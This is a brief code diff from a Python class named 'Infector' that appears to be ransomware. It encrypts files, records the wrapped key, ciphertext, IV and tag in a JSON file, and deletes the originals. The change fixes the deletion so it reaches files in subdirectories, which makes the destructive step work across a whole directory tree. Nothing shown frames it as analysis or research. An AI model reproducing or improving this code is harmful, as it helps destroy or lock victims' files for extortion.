@@ -34,7 +34,7 @@ class Infector:
                     
                     jData = json.dumps({'RSACipher': rsa2ascii, 'CT': ct2ascii, 'IV': iv2ascii, 'TAG': tag2ascii, 'EXT': EXT})
 
-                    os.remove(file)
+                    os.remove(os.path.join(root,file))
                     # Writing encryption data to JSON file
                     with open('ripLul.json', 'w') as jFile:    
                         jFile.write(jData)
